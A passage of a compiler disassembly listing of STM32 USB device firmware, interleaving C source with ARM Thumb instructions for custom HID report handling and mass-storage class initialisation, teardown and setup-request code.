 8008bcc:	46bd      	mov	sp, r7
 8008bce:	bd80      	pop	{r7, pc}

08008bd0 <USBD_CUSTOM_HID_ReceivePacket>:
  *         prepare OUT Endpoint for reception
  * @param  pdev: device instance
  * @retval status
  */
uint8_t USBD_CUSTOM_HID_ReceivePacket(USBD_HandleTypeDef *pdev)
{
 8008bd0:	b580      	push	{r7, lr}
 8008bd2:	b084      	sub	sp, #16
 8008bd4:	af00      	add	r7, sp, #0
 8008bd6:	6078      	str	r0, [r7, #4]
  USBD_CUSTOM_HID_HandleTypeDef *hhid;

  if (pdev->pClassDataCmsit[pdev->classId] == NULL)
 8008bd8:	687b      	ldr	r3, [r7, #4]
 8008bda:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 8008bde:	687b      	ldr	r3, [r7, #4]
 8008be0:	32b0      	adds	r2, #176	; 0xb0
 8008be2:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 8008be6:	2b00      	cmp	r3, #0
 8008be8:	d101      	bne.n	8008bee <USBD_CUSTOM_HID_ReceivePacket+0x1e>
  {
    return (uint8_t)USBD_FAIL;
 8008bea:	2303      	movs	r3, #3
 8008bec:	e01c      	b.n	8008c28 <USBD_CUSTOM_HID_ReceivePacket+0x58>
#ifdef USE_USBD_COMPOSITE
  /* Get OUT Endpoint address allocated for this class instance */
  CUSTOMHIDOutEpAdd = USBD_CoreGetEPAdd(pdev, USBD_EP_OUT, USBD_EP_TYPE_INTR, (uint8_t)pdev->classId);
#endif /* USE_USBD_COMPOSITE */

  hhid = (USBD_CUSTOM_HID_HandleTypeDef *)pdev->pClassDataCmsit[pdev->classId];
 8008bee:	687b      	ldr	r3, [r7, #4]
 8008bf0:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 8008bf4:	687b      	ldr	r3, [r7, #4]
 8008bf6:	32b0      	adds	r2, #176	; 0xb0
 8008bf8:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 8008bfc:	60fb      	str	r3, [r7, #12]

  /* Resume USB Out process */
  (void)USBD_LL_PrepareReceive(pdev, CUSTOMHIDOutEpAdd, hhid->Report_buf,
 8008bfe:	4b0c      	ldr	r3, [pc, #48]	; (8008c30 <USBD_CUSTOM_HID_ReceivePacket+0x60>)
 8008c00:	7819      	ldrb	r1, [r3, #0]
 8008c02:	68fa      	ldr	r2, [r7, #12]
 8008c04:	230f      	movs	r3, #15
 8008c06:	6878      	ldr	r0, [r7, #4]
 8008c08:	f004 f920 	bl	800ce4c <USBD_LL_PrepareReceive>
                               USBD_CUSTOMHID_OUTREPORT_BUF_SIZE);

  if(((recv_buffer[0]=(hhid->Report_buf[0]))&0x02) != 0x02){
 8008c0c:	68fb      	ldr	r3, [r7, #12]
 8008c0e:	781a      	ldrb	r2, [r3, #0]
 8008c10:	4b08      	ldr	r3, [pc, #32]	; (8008c34 <USBD_CUSTOM_HID_ReceivePacket+0x64>)
 8008c12:	701a      	strb	r2, [r3, #0]
 8008c14:	4b07      	ldr	r3, [pc, #28]	; (8008c34 <USBD_CUSTOM_HID_ReceivePacket+0x64>)
 8008c16:	781b      	ldrb	r3, [r3, #0]
 8008c18:	f003 0302 	and.w	r3, r3, #2
 8008c1c:	2b02      	cmp	r3, #2
 8008c1e:	d002      	beq.n	8008c26 <USBD_CUSTOM_HID_ReceivePacket+0x56>
	  InterruptFlag = 1;
 8008c20:	4b05      	ldr	r3, [pc, #20]	; (8008c38 <USBD_CUSTOM_HID_ReceivePacket+0x68>)
 8008c22:	2201      	movs	r2, #1
 8008c24:	601a      	str	r2, [r3, #0]
  }
  return (uint8_t)USBD_OK;
 8008c26:	2300      	movs	r3, #0
}
 8008c28:	4618      	mov	r0, r3
 8008c2a:	3710      	adds	r7, #16
 8008c2c:	46bd      	mov	sp, r7
 8008c2e:	bd80      	pop	{r7, pc}
 8008c30:	200000a7 	.word	0x200000a7
 8008c34:	2000026c 	.word	0x2000026c
 8008c38:	20000270 	.word	0x20000270

08008c3c <USBD_CUSTOM_HID_EP0_RxReady>:
  *         Handles control request data.
  * @param  pdev: device instance
  * @retval status
  */
static uint8_t USBD_CUSTOM_HID_EP0_RxReady(USBD_HandleTypeDef *pdev)
{
 8008c3c:	b580      	push	{r7, lr}
 8008c3e:	b084      	sub	sp, #16
 8008c40:	af00      	add	r7, sp, #0
 8008c42:	6078      	str	r0, [r7, #4]
  USBD_CUSTOM_HID_HandleTypeDef *hhid = (USBD_CUSTOM_HID_HandleTypeDef *)pdev->pClassDataCmsit[pdev->classId];
 8008c44:	687b      	ldr	r3, [r7, #4]
 8008c46:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 8008c4a:	687b      	ldr	r3, [r7, #4]
 8008c4c:	32b0      	adds	r2, #176	; 0xb0
 8008c4e:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 8008c52:	60fb      	str	r3, [r7, #12]

  if (hhid == NULL)
 8008c54:	68fb      	ldr	r3, [r7, #12]
 8008c56:	2b00      	cmp	r3, #0
 8008c58:	d101      	bne.n	8008c5e <USBD_CUSTOM_HID_EP0_RxReady+0x22>
  {
    return (uint8_t)USBD_FAIL;
 8008c5a:	2303      	movs	r3, #3
 8008c5c:	e016      	b.n	8008c8c <USBD_CUSTOM_HID_EP0_RxReady+0x50>
  }

  if (hhid->IsReportAvailable == 1U)
 8008c5e:	68fb      	ldr	r3, [r7, #12]
 8008c60:	69db      	ldr	r3, [r3, #28]
 8008c62:	2b01      	cmp	r3, #1
 8008c64:	d111      	bne.n	8008c8a <USBD_CUSTOM_HID_EP0_RxReady+0x4e>
  {
    ((USBD_CUSTOM_HID_ItfTypeDef *)pdev->pUserData[pdev->classId])->OutEvent(hhid->Report_buf[0],
 8008c66:	687b      	ldr	r3, [r7, #4]
 8008c68:	f8d3 32d4 	ldr.w	r3, [r3, #724]	; 0x2d4
 8008c6c:	687a      	ldr	r2, [r7, #4]
 8008c6e:	33b0      	adds	r3, #176	; 0xb0
 8008c70:	009b      	lsls	r3, r3, #2
 8008c72:	4413      	add	r3, r2
 8008c74:	685b      	ldr	r3, [r3, #4]
 8008c76:	68db      	ldr	r3, [r3, #12]
 8008c78:	68fa      	ldr	r2, [r7, #12]
 8008c7a:	7810      	ldrb	r0, [r2, #0]
 8008c7c:	68fa      	ldr	r2, [r7, #12]
 8008c7e:	7852      	ldrb	r2, [r2, #1]
 8008c80:	4611      	mov	r1, r2
 8008c82:	4798      	blx	r3
                                                                             hhid->Report_buf[1]);
    hhid->IsReportAvailable = 0U;
 8008c84:	68fb      	ldr	r3, [r7, #12]
 8008c86:	2200      	movs	r2, #0
 8008c88:	61da      	str	r2, [r3, #28]
  }

  return (uint8_t)USBD_OK;
 8008c8a:	2300      	movs	r3, #0
}
 8008c8c:	4618      	mov	r0, r3
 8008c8e:	3710      	adds	r7, #16
 8008c90:	46bd      	mov	sp, r7
 8008c92:	bd80      	pop	{r7, pc}

08008c94 <USBD_CUSTOM_HID_GetDeviceQualifierDesc>:
  *         return Device Qualifier descriptor
  * @param  length : pointer data length
  * @retval pointer to descriptor buffer
  */
static uint8_t *USBD_CUSTOM_HID_GetDeviceQualifierDesc(uint16_t *length)
{
 8008c94:	b480      	push	{r7}
 8008c96:	b083      	sub	sp, #12
 8008c98:	af00      	add	r7, sp, #0
 8008c9a:	6078      	str	r0, [r7, #4]
  *length = (uint16_t)sizeof(USBD_CUSTOM_HID_DeviceQualifierDesc);
 8008c9c:	687b      	ldr	r3, [r7, #4]
 8008c9e:	220a      	movs	r2, #10
 8008ca0:	801a      	strh	r2, [r3, #0]

  return USBD_CUSTOM_HID_DeviceQualifierDesc;
 8008ca2:	4b03      	ldr	r3, [pc, #12]	; (8008cb0 <USBD_CUSTOM_HID_GetDeviceQualifierDesc+0x1c>)
}
 8008ca4:	4618      	mov	r0, r3
 8008ca6:	370c      	adds	r7, #12
 8008ca8:	46bd      	mov	sp, r7
 8008caa:	f85d 7b04 	ldr.w	r7, [sp], #4
 8008cae:	4770      	bx	lr
 8008cb0:	2000009c 	.word	0x2000009c

08008cb4 <USBD_CUSTOM_HID_RegisterInterface>:
  * @param  fops: CUSTOMHID Interface callback
  * @retval status
  */
uint8_t USBD_CUSTOM_HID_RegisterInterface(USBD_HandleTypeDef *pdev,
                                          USBD_CUSTOM_HID_ItfTypeDef *fops)
{
 8008cb4:	b480      	push	{r7}
 8008cb6:	b083      	sub	sp, #12
 8008cb8:	af00      	add	r7, sp, #0
 8008cba:	6078      	str	r0, [r7, #4]
 8008cbc:	6039      	str	r1, [r7, #0]
  if (fops == NULL)
 8008cbe:	683b      	ldr	r3, [r7, #0]
 8008cc0:	2b00      	cmp	r3, #0
 8008cc2:	d101      	bne.n	8008cc8 <USBD_CUSTOM_HID_RegisterInterface+0x14>
  {
    return (uint8_t)USBD_FAIL;
 8008cc4:	2303      	movs	r3, #3
 8008cc6:	e009      	b.n	8008cdc <USBD_CUSTOM_HID_RegisterInterface+0x28>
  }

  pdev->pUserData[pdev->classId] = fops;
 8008cc8:	687b      	ldr	r3, [r7, #4]
 8008cca:	f8d3 32d4 	ldr.w	r3, [r3, #724]	; 0x2d4
 8008cce:	687a      	ldr	r2, [r7, #4]
 8008cd0:	33b0      	adds	r3, #176	; 0xb0
 8008cd2:	009b      	lsls	r3, r3, #2
 8008cd4:	4413      	add	r3, r2
 8008cd6:	683a      	ldr	r2, [r7, #0]
 8008cd8:	605a      	str	r2, [r3, #4]

  return (uint8_t)USBD_OK;
 8008cda:	2300      	movs	r3, #0
}
 8008cdc:	4618      	mov	r0, r3
 8008cde:	370c      	adds	r7, #12
 8008ce0:	46bd      	mov	sp, r7
 8008ce2:	f85d 7b04 	ldr.w	r7, [sp], #4
 8008ce6:	4770      	bx	lr

08008ce8 <USBD_MSC_Init>:
  * @param  pdev: device instance
  * @param  cfgidx: configuration index
  * @retval status
  */
uint8_t USBD_MSC_Init(USBD_HandleTypeDef *pdev, uint8_t cfgidx)
{
 8008ce8:	b580      	push	{r7, lr}
 8008cea:	b084      	sub	sp, #16
 8008cec:	af00      	add	r7, sp, #0
 8008cee:	6078      	str	r0, [r7, #4]
 8008cf0:	460b      	mov	r3, r1
 8008cf2:	70fb      	strb	r3, [r7, #3]
  UNUSED(cfgidx);
  USBD_MSC_BOT_HandleTypeDef *hmsc;

  hmsc = (USBD_MSC_BOT_HandleTypeDef *)USBD_malloc_MSC(sizeof(USBD_MSC_BOT_HandleTypeDef));
 8008cf4:	f241 0074 	movw	r0, #4212	; 0x1074
 8008cf8:	f004 f938 	bl	800cf6c <USBD_static_malloc_MSC>
 8008cfc:	60f8      	str	r0, [r7, #12]

  if (hmsc == NULL)
 8008cfe:	68fb      	ldr	r3, [r7, #12]
 8008d00:	2b00      	cmp	r3, #0
 8008d02:	d109      	bne.n	8008d18 <USBD_MSC_Init+0x30>
  {
    pdev->pClassDataCmsit[pdev->classId] = NULL;
 8008d04:	687b      	ldr	r3, [r7, #4]
 8008d06:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 8008d0a:	687b      	ldr	r3, [r7, #4]
 8008d0c:	32b0      	adds	r2, #176	; 0xb0
 8008d0e:	2100      	movs	r1, #0
 8008d10:	f843 1022 	str.w	r1, [r3, r2, lsl #2]
    return (uint8_t)USBD_EMEM;
 8008d14:	2302      	movs	r3, #2
 8008d16:	e06e      	b.n	8008df6 <USBD_MSC_Init+0x10e>
  }

  pdev->pClassDataCmsit[pdev->classId] = (void *)hmsc;
 8008d18:	687b      	ldr	r3, [r7, #4]
 8008d1a:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 8008d1e:	687b      	ldr	r3, [r7, #4]
 8008d20:	32b0      	adds	r2, #176	; 0xb0
 8008d22:	68f9      	ldr	r1, [r7, #12]
 8008d24:	f843 1022 	str.w	r1, [r3, r2, lsl #2]
  pdev->pClassData = pdev->pClassDataCmsit[pdev->classId];
 8008d28:	687b      	ldr	r3, [r7, #4]
 8008d2a:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 8008d2e:	687b      	ldr	r3, [r7, #4]
 8008d30:	32b0      	adds	r2, #176	; 0xb0
 8008d32:	f853 2022 	ldr.w	r2, [r3, r2, lsl #2]
 8008d36:	687b      	ldr	r3, [r7, #4]
 8008d38:	f8c3 22bc 	str.w	r2, [r3, #700]	; 0x2bc
  /* Get the Endpoints addresses allocated for this class instance */
  MSCInEpAdd  = USBD_CoreGetEPAdd(pdev, USBD_EP_IN, USBD_EP_TYPE_BULK, (uint8_t)pdev->classId);
  MSCOutEpAdd = USBD_CoreGetEPAdd(pdev, USBD_EP_OUT, USBD_EP_TYPE_BULK, (uint8_t)pdev->classId);
#endif /* USE_USBD_COMPOSITE */

  if (pdev->dev_speed == USBD_SPEED_HIGH)
 8008d3c:	687b      	ldr	r3, [r7, #4]
 8008d3e:	7c1b      	ldrb	r3, [r3, #16]
 8008d40:	2b00      	cmp	r3, #0
 8008d42:	d12b      	bne.n	8008d9c <USBD_MSC_Init+0xb4>
  {
    /* Open EP OUT */
    (void)USBD_LL_OpenEP(pdev, MSCOutEpAdd, USBD_EP_TYPE_BULK, MSC_MAX_HS_PACKET);
 8008d44:	4b2e      	ldr	r3, [pc, #184]	; (8008e00 <USBD_MSC_Init+0x118>)
 8008d46:	7819      	ldrb	r1, [r3, #0]
 8008d48:	f44f 7300 	mov.w	r3, #512	; 0x200
 8008d4c:	2202      	movs	r2, #2
 8008d4e:	6878      	ldr	r0, [r7, #4]
 8008d50:	f003 feca 	bl	800cae8 <USBD_LL_OpenEP>
    pdev->ep_out[MSCOutEpAdd & 0xFU].is_used = 1U;
 8008d54:	4b2a      	ldr	r3, [pc, #168]	; (8008e00 <USBD_MSC_Init+0x118>)
 8008d56:	781b      	ldrb	r3, [r3, #0]
 8008d58:	f003 020f 	and.w	r2, r3, #15
 8008d5c:	6879      	ldr	r1, [r7, #4]
 8008d5e:	4613      	mov	r3, r2
 8008d60:	009b      	lsls	r3, r3, #2
 8008d62:	4413      	add	r3, r2
 8008d64:	009b      	lsls	r3, r3, #2
 8008d66:	440b      	add	r3, r1
 8008d68:	f503 73b2 	add.w	r3, r3, #356	; 0x164
 8008d6c:	2201      	movs	r2, #1
 8008d6e:	801a      	strh	r2, [r3, #0]

    /* Open EP IN */
    (void)USBD_LL_OpenEP(pdev, MSCInEpAdd, USBD_EP_TYPE_BULK, MSC_MAX_HS_PACKET);
 8008d70:	4b24      	ldr	r3, [pc, #144]	; (8008e04 <USBD_MSC_Init+0x11c>)
 8008d72:	7819      	ldrb	r1, [r3, #0]
 8008d74:	f44f 7300 	mov.w	r3, #512	; 0x200
 8008d78:	2202      	movs	r2, #2
 8008d7a:	6878      	ldr	r0, [r7, #4]
 8008d7c:	f003 feb4 	bl	800cae8 <USBD_LL_OpenEP>
    pdev->ep_in[MSCInEpAdd & 0xFU].is_used = 1U;
 8008d80:	4b20      	ldr	r3, [pc, #128]	; (8008e04 <USBD_MSC_Init+0x11c>)
 8008d82:	781b      	ldrb	r3, [r3, #0]
 8008d84:	f003 020f 	and.w	r2, r3, #15
 8008d88:	6879      	ldr	r1, [r7, #4]
 8008d8a:	4613      	mov	r3, r2
 8008d8c:	009b      	lsls	r3, r3, #2
 8008d8e:	4413      	add	r3, r2
 8008d90:	009b      	lsls	r3, r3, #2
 8008d92:	440b      	add	r3, r1
 8008d94:	3324      	adds	r3, #36	; 0x24
 8008d96:	2201      	movs	r2, #1
 8008d98:	801a      	strh	r2, [r3, #0]
 8008d9a:	e028      	b.n	8008dee <USBD_MSC_Init+0x106>
  }
  else
  {
    /* Open EP OUT */
    (void)USBD_LL_OpenEP(pdev, MSCOutEpAdd, USBD_EP_TYPE_BULK, MSC_MAX_FS_PACKET);
 8008d9c:	4b18      	ldr	r3, [pc, #96]	; (8008e00 <USBD_MSC_Init+0x118>)
 8008d9e:	7819      	ldrb	r1, [r3, #0]
 8008da0:	2340      	movs	r3, #64	; 0x40
 8008da2:	2202      	movs	r2, #2
 8008da4:	6878      	ldr	r0, [r7, #4]
 8008da6:	f003 fe9f 	bl	800cae8 <USBD_LL_OpenEP>
    pdev->ep_out[MSCOutEpAdd & 0xFU].is_used = 1U;
 8008daa:	4b15      	ldr	r3, [pc, #84]	; (8008e00 <USBD_MSC_Init+0x118>)
 8008dac:	781b      	ldrb	r3, [r3, #0]
 8008dae:	f003 020f 	and.w	r2, r3, #15
 8008db2:	6879      	ldr	r1, [r7, #4]
 8008db4:	4613      	mov	r3, r2
 8008db6:	009b      	lsls	r3, r3, #2
 8008db8:	4413      	add	r3, r2
 8008dba:	009b      	lsls	r3, r3, #2
 8008dbc:	440b      	add	r3, r1
 8008dbe:	f503 73b2 	add.w	r3, r3, #356	; 0x164
 8008dc2:	2201      	movs	r2, #1
 8008dc4:	801a      	strh	r2, [r3, #0]

    /* Open EP IN */
    (void)USBD_LL_OpenEP(pdev, MSCInEpAdd, USBD_EP_TYPE_BULK, MSC_MAX_FS_PACKET);
 8008dc6:	4b0f      	ldr	r3, [pc, #60]	; (8008e04 <USBD_MSC_Init+0x11c>)
 8008dc8:	7819      	ldrb	r1, [r3, #0]
 8008dca:	2340      	movs	r3, #64	; 0x40
 8008dcc:	2202      	movs	r2, #2
 8008dce:	6878      	ldr	r0, [r7, #4]
 8008dd0:	f003 fe8a 	bl	800cae8 <USBD_LL_OpenEP>
    pdev->ep_in[MSCInEpAdd & 0xFU].is_used = 1U;
 8008dd4:	4b0b      	ldr	r3, [pc, #44]	; (8008e04 <USBD_MSC_Init+0x11c>)
 8008dd6:	781b      	ldrb	r3, [r3, #0]
 8008dd8:	f003 020f 	and.w	r2, r3, #15
 8008ddc:	6879      	ldr	r1, [r7, #4]
 8008dde:	4613      	mov	r3, r2
 8008de0:	009b      	lsls	r3, r3, #2
 8008de2:	4413      	add	r3, r2
 8008de4:	009b      	lsls	r3, r3, #2
 8008de6:	440b      	add	r3, r1
 8008de8:	3324      	adds	r3, #36	; 0x24
 8008dea:	2201      	movs	r2, #1
 8008dec:	801a      	strh	r2, [r3, #0]
  }

  /* Init the BOT  layer */
  MSC_BOT_Init(pdev);
 8008dee:	6878      	ldr	r0, [r7, #4]
 8008df0:	f000 fa2c 	bl	800924c <MSC_BOT_Init>

  return (uint8_t)USBD_OK;
 8008df4:	2300      	movs	r3, #0
}
 8008df6:	4618      	mov	r0, r3
 8008df8:	3710      	adds	r7, #16
 8008dfa:	46bd      	mov	sp, r7
 8008dfc:	bd80      	pop	{r7, pc}
 8008dfe:	bf00      	nop
 8008e00:	2000010b 	.word	0x2000010b
 8008e04:	2000010a 	.word	0x2000010a

08008e08 <USBD_MSC_DeInit>:
  * @param  pdev: device instance
  * @param  cfgidx: configuration index
  * @retval status
  */
uint8_t USBD_MSC_DeInit(USBD_HandleTypeDef *pdev, uint8_t cfgidx)
{
 8008e08:	b580      	push	{r7, lr}
 8008e0a:	b082      	sub	sp, #8
 8008e0c:	af00      	add	r7, sp, #0
 8008e0e:	6078      	str	r0, [r7, #4]
 8008e10:	460b      	mov	r3, r1
 8008e12:	70fb      	strb	r3, [r7, #3]
  MSCInEpAdd  = USBD_CoreGetEPAdd(pdev, USBD_EP_IN, USBD_EP_TYPE_BULK, (uint8_t)pdev->classId);
  MSCOutEpAdd = USBD_CoreGetEPAdd(pdev, USBD_EP_OUT, USBD_EP_TYPE_BULK, (uint8_t)pdev->classId);
#endif /* USE_USBD_COMPOSITE */

  /* Close MSC EPs */
  (void)USBD_LL_CloseEP(pdev, MSCOutEpAdd);
 8008e14:	4b26      	ldr	r3, [pc, #152]	; (8008eb0 <USBD_MSC_DeInit+0xa8>)
 8008e16:	781b      	ldrb	r3, [r3, #0]
 8008e18:	4619      	mov	r1, r3
 8008e1a:	6878      	ldr	r0, [r7, #4]
 8008e1c:	f003 fea2 	bl	800cb64 <USBD_LL_CloseEP>
  pdev->ep_out[MSCOutEpAdd & 0xFU].is_used = 0U;
 8008e20:	4b23      	ldr	r3, [pc, #140]	; (8008eb0 <USBD_MSC_DeInit+0xa8>)
 8008e22:	781b      	ldrb	r3, [r3, #0]
 8008e24:	f003 020f 	and.w	r2, r3, #15
 8008e28:	6879      	ldr	r1, [r7, #4]
 8008e2a:	4613      	mov	r3, r2
 8008e2c:	009b      	lsls	r3, r3, #2
 8008e2e:	4413      	add	r3, r2
 8008e30:	009b      	lsls	r3, r3, #2
 8008e32:	440b      	add	r3, r1
 8008e34:	f503 73b2 	add.w	r3, r3, #356	; 0x164
 8008e38:	2200      	movs	r2, #0
 8008e3a:	801a      	strh	r2, [r3, #0]

  /* Close EP IN */
  (void)USBD_LL_CloseEP(pdev, MSCInEpAdd);
 8008e3c:	4b1d      	ldr	r3, [pc, #116]	; (8008eb4 <USBD_MSC_DeInit+0xac>)
 8008e3e:	781b      	ldrb	r3, [r3, #0]
 8008e40:	4619      	mov	r1, r3
 8008e42:	6878      	ldr	r0, [r7, #4]
 8008e44:	f003 fe8e 	bl	800cb64 <USBD_LL_CloseEP>
  pdev->ep_in[MSCInEpAdd & 0xFU].is_used = 0U;
 8008e48:	4b1a      	ldr	r3, [pc, #104]	; (8008eb4 <USBD_MSC_DeInit+0xac>)
 8008e4a:	781b      	ldrb	r3, [r3, #0]
 8008e4c:	f003 020f 	and.w	r2, r3, #15
 8008e50:	6879      	ldr	r1, [r7, #4]
 8008e52:	4613      	mov	r3, r2
 8008e54:	009b      	lsls	r3, r3, #2
 8008e56:	4413      	add	r3, r2
 8008e58:	009b      	lsls	r3, r3, #2
 8008e5a:	440b      	add	r3, r1
 8008e5c:	3324      	adds	r3, #36	; 0x24
 8008e5e:	2200      	movs	r2, #0
 8008e60:	801a      	strh	r2, [r3, #0]

  /* Free MSC Class Resources */
  if (pdev->pClassDataCmsit[pdev->classId] != NULL)
 8008e62:	687b      	ldr	r3, [r7, #4]
 8008e64:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 8008e68:	687b      	ldr	r3, [r7, #4]
 8008e6a:	32b0      	adds	r2, #176	; 0xb0
 8008e6c:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 8008e70:	2b00      	cmp	r3, #0
 8008e72:	d018      	beq.n	8008ea6 <USBD_MSC_DeInit+0x9e>
  {
    /* De-Init the BOT layer */
    MSC_BOT_DeInit(pdev);
 8008e74:	6878      	ldr	r0, [r7, #4]
 8008e76:	f000 fa6f 	bl	8009358 <MSC_BOT_DeInit>

    (void)USBD_free(pdev->pClassDataCmsit[pdev->classId]);
 8008e7a:	687b      	ldr	r3, [r7, #4]
 8008e7c:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 8008e80:	687b      	ldr	r3, [r7, #4]
 8008e82:	32b0      	adds	r2, #176	; 0xb0
 8008e84:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 8008e88:	4618      	mov	r0, r3
 8008e8a:	f004 f87d 	bl	800cf88 <USBD_static_free>
    pdev->pClassDataCmsit[pdev->classId]  = NULL;
 8008e8e:	687b      	ldr	r3, [r7, #4]
 8008e90:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 8008e94:	687b      	ldr	r3, [r7, #4]
 8008e96:	32b0      	adds	r2, #176	; 0xb0
 8008e98:	2100      	movs	r1, #0
 8008e9a:	f843 1022 	str.w	r1, [r3, r2, lsl #2]
    pdev->pClassData = NULL;
 8008e9e:	687b      	ldr	r3, [r7, #4]
 8008ea0:	2200      	movs	r2, #0
 8008ea2:	f8c3 22bc 	str.w	r2, [r3, #700]	; 0x2bc
  }

  return (uint8_t)USBD_OK;
 8008ea6:	2300      	movs	r3, #0
}
 8008ea8:	4618      	mov	r0, r3
 8008eaa:	3708      	adds	r7, #8
 8008eac:	46bd      	mov	sp, r7
 8008eae:	bd80      	pop	{r7, pc}
 8008eb0:	2000010b 	.word	0x2000010b
 8008eb4:	2000010a 	.word	0x2000010a

08008eb8 <USBD_MSC_Setup>:
  * @param  pdev: device instance
  * @param  req: USB request
  * @retval status
  */
uint8_t USBD_MSC_Setup(USBD_HandleTypeDef *pdev, USBD_SetupReqTypedef *req)
{
 8008eb8:	b580      	push	{r7, lr}
 8008eba:	b086      	sub	sp, #24
 8008ebc:	af00      	add	r7, sp, #0
 8008ebe:	6078      	str	r0, [r7, #4]
 8008ec0:	6039      	str	r1, [r7, #0]
  USBD_MSC_BOT_HandleTypeDef *hmsc = (USBD_MSC_BOT_HandleTypeDef *)pdev->pClassDataCmsit[pdev->classId];
 8008ec2:	687b      	ldr	r3, [r7, #4]
 8008ec4:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 8008ec8:	687b      	ldr	r3, [r7, #4]
 8008eca:	32b0      	adds	r2, #176	; 0xb0
 8008ecc:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 8008ed0:	613b      	str	r3, [r7, #16]
  USBD_StatusTypeDef ret = USBD_OK;
 8008ed2:	2300      	movs	r3, #0
 8008ed4:	75fb      	strb	r3, [r7, #23]
  uint16_t status_info = 0U;
 8008ed6:	2300      	movs	r3, #0
 8008ed8:	81fb      	strh	r3, [r7, #14]
  /* Get the Endpoints addresses allocated for this class instance */
  MSCInEpAdd  = USBD_CoreGetEPAdd(pdev, USBD_EP_IN, USBD_EP_TYPE_BULK, (uint8_t)pdev->classId);
  MSCOutEpAdd = USBD_CoreGetEPAdd(pdev, USBD_EP_OUT, USBD_EP_TYPE_BULK, (uint8_t)pdev->classId);
#endif /* USE_USBD_COMPOSITE */

  if (hmsc == NULL)
 8008eda:	693b      	ldr	r3, [r7, #16]
 8008edc:	2b00      	cmp	r3, #0
 8008ede:	d101      	bne.n	8008ee4 <USBD_MSC_Setup+0x2c>
  {
    return (uint8_t)USBD_FAIL;
 8008ee0:	2303      	movs	r3, #3
 8008ee2:	e0e1      	b.n	80090a8 <USBD_MSC_Setup+0x1f0>
  }

  switch (req->bmRequest & USB_REQ_TYPE_MASK)
 8008ee4:	683b      	ldr	r3, [r7, #0]
 8008ee6:	781b      	ldrb	r3, [r3, #0]
 8008ee8:	f003 0360 	and.w	r3, r3, #96	; 0x60
 8008eec:	2b00      	cmp	r3, #0
 8008eee:	d053      	beq.n	8008f98 <USBD_MSC_Setup+0xe0>
 8008ef0:	2b20      	cmp	r3, #32
 8008ef2:	f040 80d1 	bne.w	8009098 <USBD_MSC_Setup+0x1e0>
  {
    /* Class request */
    case USB_REQ_TYPE_CLASS:
      switch (req->bRequest)
 8008ef6:	683b      	ldr	r3, [r7, #0]
 8008ef8:	785b      	ldrb	r3, [r3, #1]
 8008efa:	2bfe      	cmp	r3, #254	; 0xfe
 8008efc:	d002      	beq.n	8008f04 <USBD_MSC_Setup+0x4c>
 8008efe:	2bff      	cmp	r3, #255	; 0xff
 8008f00:	d02a      	beq.n	8008f58 <USBD_MSC_Setup+0xa0>
 8008f02:	e041      	b.n	8008f88 <USBD_MSC_Setup+0xd0>
      {
        case BOT_GET_MAX_LUN:
          if ((req->wValue  == 0U) && (req->wLength == 1U) &&
 8008f04:	683b      	ldr	r3, [r7, #0]
 8008f06:	885b      	ldrh	r3, [r3, #2]
 8008f08:	2b00      	cmp	r3, #0
 8008f0a:	d11e      	bne.n	8008f4a <USBD_MSC_Setup+0x92>
 8008f0c:	683b      	ldr	r3, [r7, #0]
 8008f0e:	88db      	ldrh	r3, [r3, #6]
 8008f10:	2b01      	cmp	r3, #1
 8008f12:	d11a      	bne.n	8008f4a <USBD_MSC_Setup+0x92>
              ((req->bmRequest & 0x80U) == 0x80U))
 8008f14:	683b      	ldr	r3, [r7, #0]
 8008f16:	781b      	ldrb	r3, [r3, #0]
 8008f18:	b25b      	sxtb	r3, r3
          if ((req->wValue  == 0U) && (req->wLength == 1U) &&
 8008f1a:	2b00      	cmp	r3, #0
 8008f1c:	da15      	bge.n	8008f4a <USBD_MSC_Setup+0x92>
          {
            hmsc->max_lun = (uint32_t)((USBD_StorageTypeDef *)pdev->pUserData[pdev->classId])->GetMaxLun();
 8008f1e:	687b      	ldr	r3, [r7, #4]
 8008f20:	f8d3 32d4 	ldr.w	r3, [r3, #724]	; 0x2d4
 8008f24:	687a      	ldr	r2, [r7, #4]
 8008f26:	33b0      	adds	r3, #176	; 0xb0
 8008f28:	009b      	lsls	r3, r3, #2
 8008f2a:	4413      	add	r3, r2
 8008f2c:	685b      	ldr	r3, [r3, #4]
 8008f2e:	699b      	ldr	r3, [r3, #24]
 8008f30:	4798      	blx	r3
 8008f32:	4603      	mov	r3, r0
 8008f34:	461a      	mov	r2, r3
 8008f36:	693b      	ldr	r3, [r7, #16]
 8008f38:	601a      	str	r2, [r3, #0]
            (void)USBD_CtlSendData(pdev, (uint8_t *)&hmsc->max_lun, 1U);
 8008f3a:	693b      	ldr	r3, [r7, #16]
 8008f3c:	2201      	movs	r2, #1
 8008f3e:	4619      	mov	r1, r3
 8008f40:	6878      	ldr	r0, [r7, #4]
 8008f42:	f003 f979 	bl	800c238 <USBD_CtlSendData>
 8008f46:	bf00      	nop
          else
          {
            USBD_CtlError(pdev, req);
            ret = USBD_FAIL;
          }
          break;
 8008f48:	e025      	b.n	8008f96 <USBD_MSC_Setup+0xde>
            USBD_CtlError(pdev, req);
 8008f4a:	6839      	ldr	r1, [r7, #0]
 8008f4c:	6878      	ldr	r0, [r7, #4]
 8008f4e:	f003 f902 	bl	800c156 <USBD_CtlError>
            ret = USBD_FAIL;
 8008f52:	2303      	movs	r3, #3
 8008f54:	75fb      	strb	r3, [r7, #23]
          break;
 8008f56:	e01e      	b.n	8008f96 <USBD_MSC_Setup+0xde>

        case BOT_RESET :
          if ((req->wValue  == 0U) && (req->wLength == 0U) &&
